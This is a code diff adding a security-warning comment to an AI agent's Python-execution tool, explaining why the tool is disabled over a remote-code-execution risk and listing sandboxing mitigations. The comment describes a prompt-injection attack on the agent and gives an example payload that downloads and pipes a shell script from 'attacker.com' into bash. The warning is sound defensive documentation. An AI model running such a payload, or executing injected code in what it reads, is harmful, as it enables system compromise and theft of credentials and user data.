@@ -1,3 +1,43 @@
+/**
+ * ⚠️ SECURITY WARNING: THIS TOOL IS DISABLED DUE TO CRITICAL RCE VULNERABILITY ⚠️
+ * 
+ * VULNERABILITY: Remote Code Execution (RCE)
+ * SEVERITY: CRITICAL
+ * CVE: Pending
+ * 
+ * ISSUE:
+ * This tool uses child_process.exec() to execute arbitrary Python code without proper sandboxing.
+ * Timeout and maxBuffer are NOT sufficient security controls.
+ * 
+ * ATTACK VECTOR:
+ * An attacker can manipulate the AI agent via prompt injection to execute malicious code:
+ * Example: "import os; os.system('curl attacker.com/shell.sh | bash')"
+ * 
+ * IMPACT:
+ * - Complete system compromise
+ * - Data exfiltration (database credentials, API keys, user data)
+ * - Denial of Service (resource exhaustion, system shutdown)
+ * - Lateral movement to other systems
+ * 
+ * MITIGATION (Required before re-enabling):
+ * 1. Implement containerized execution (Docker with --security-opt no-new-privileges)
+ * 2. Use syscall filtering (seccomp profiles)
+ * 3. Network isolation (no outbound connections)
+ * 4. Resource limits (cgroups: CPU, memory, disk I/O)
+ * 5. Read-only filesystem with minimal writable /tmp
+ * 6. Run as non-root user with minimal capabilities
+ * 7. Implement code static analysis before execution
+ * 8. Add execution audit logging
+ * 
+ * ALTERNATIVES:
+ * - Use WebAssembly sandboxed execution
+ * - Use Firecracker microVMs
+ * - Use gVisor for kernel-level isolation
+ * 
+ * STATUS: DISABLED in server/agent/tools/index.ts
+ * DO NOT RE-ENABLE WITHOUT IMPLEMENTING PROPER SANDBOXING
+ */
+
 import type { AgentObservation } from "../react-engine";
 import { exec } from "child_process";
 import { promisify } from "util";
